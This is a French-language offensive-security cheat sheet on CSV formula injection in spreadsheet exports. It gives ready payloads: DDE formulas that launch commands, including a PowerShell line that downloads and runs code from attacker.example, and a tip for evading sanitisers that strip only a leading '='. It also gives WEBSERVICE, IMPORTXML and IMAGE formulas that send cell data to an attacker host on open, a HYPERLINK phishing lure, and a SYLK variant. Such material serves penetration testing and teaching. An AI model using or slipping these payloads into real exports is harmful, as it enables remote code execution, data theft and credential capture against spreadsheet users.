---
title: "Injection de formule CSV"
description: "Les cellules exportées commençant par =, +, - ou @ sont évaluées comme des formules par les tableurs, permettant l'exécution de commande via DDE et l'exfiltration de données via les fonctions web."
keywords:
  - injection csv
  - injection de formule
  - tableur
  - dde
  - webservice
  - hyperlink
---

# CSV

Les tableurs évaluent une cellule comme une formule lorsque son texte commence par certains caractères. Si une application exporte des données contrôlées par l'attaquant en CSV (ou TSV, SYLK, XLS) sans neutraliser ces cellules, ouvrir le fichier dans Excel, LibreOffice Calc ou Google Sheets exécute la formule de l'attaquant sur la machine de la victime.

## Caractères déclencheurs

Une cellule est traitée comme une formule lorsqu'elle commence par l'un des caractères suivants :

```
=   +   -   @
```

La tabulation (`0x09`) et le retour chariot (`0x0D`) amorcent aussi l'analyse de formule dans certains clients. Tout champ stocké qui atteint l'export (nom d'utilisateur, commentaire, nom de produit, ligne d'adresse) est un candidat. Soumettez le payload via le formulaire normal de l'application ; il se déclenche lorsqu'une victime ouvre le tableur généré.

## Exécution de commande via DDE

Le Dynamic Data Exchange historique d'Excel permet à une formule de lancer un programme externe. La preuve classique déclenche la calculatrice :

```
=cmd|'/c calc'!A1
```

Remplacez la commande par quelque chose d'impactant, par exemple récupérer et exécuter un payload :

```
=cmd|'/c powershell -w hidden -c "iwr http://attacker.example/a|iex"'!A1
```

La victime est invitée à activer le DDE/le contenu, mais l'ingénierie sociale et les rapports internes « de confiance » obtiennent souvent ce clic. Une cellule n'est analysée comme formule que lorsque son **premier octet** est un déclencheur, donc là où un assainisseur retire ou échappe seulement un `=` en tête mais néglige les autres déclencheurs, commencez par l'un de ceux-là. `+`, `-`, `@`, une tabulation (`0x09`) et un retour chariot (`0x0D`) amorcent tous l'analyse de formule :

```
@cmd|'/c calc'!A1
+cmd|'/c calc'!A1
```

Une tabulation ou un CR en tête avant `=` fonctionne de la même façon : l'espace blanc est consommé et `=cmd|'/c calc'!A1` s'analyse toujours. Préfixer un second déclencheur après celui qui est retiré n'aide pas, puisqu'une fois le premier octet retiré le survivant commence par du texte.

## Exfiltration de données sans clic

Certaines fonctions s'évaluent à l'ouverture sans l'invite DDE, divulguant les données de cellule vers un serveur attaquant. `WEBSERVICE` récupère une URL et peut porter des données adjacentes dans la chaîne de requête :

```
=WEBSERVICE("http://attacker.example/x?v="&A1)
=WEBSERVICE(CONCATENATE("http://attacker.example/?",A1))
```

Google Sheets offre des équivalents qui récupèrent du contenu distant et exfiltrent au chargement :

```
=IMPORTXML("http://attacker.example/?d="&A2,"//a")
=IMPORTDATA("http://attacker.example/?d="&A2)
=IMAGE("http://attacker.example/?d="&A2)
```

## Appâtage par hyperlien

`HYPERLINK` rend un texte cliquable qui masque une destination hostile, utile pour la capture d'identifiants ou la livraison de payload :

```
=HYPERLINK("http://attacker.example/login","Open quarterly report")
```

## Variantes TSV, SYLK et XLS

Les mêmes cellules de formule s'appliquent lorsque l'export est séparé par des tabulations ; les caractères déclencheurs sont identiques, seul le délimiteur diffère. Les fichiers SYLK analysent les formules directement, donc un fichier servi avec une extension `.slk` et un en-tête `ID;P` exécute les expressions de cellule :

```
ID;P
C;X1;Y1;K0;E=cmd|'/c calc'!A1
E
```

Les véritables exports `.xls` et `.xlsx` portent les formules nativement, donc toute chaîne d'attaquant écrite dans une cellule typée formule s'évalue sans aucune astuce de caractère en tête nécessaire.

## Outils

- **LibreOffice Calc / Excel** : ouvrir le fichier exporté pour vérifier l'exécution de formule.
- **[Burp Suite](https://portswigger.net/burp)** : Repeater pour soumettre des payloads de formule dans les champs stockés.
- Payloads manuels utilisant les caractères déclencheurs (`=`, `+`, `-`, `@`).

## Références

- [OWASP: CSV Injection](https://owasp.org/www-community/attacks/CSV_Injection)
- [PayloadsAllTheThings: CSV Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/CSV%20Injection)
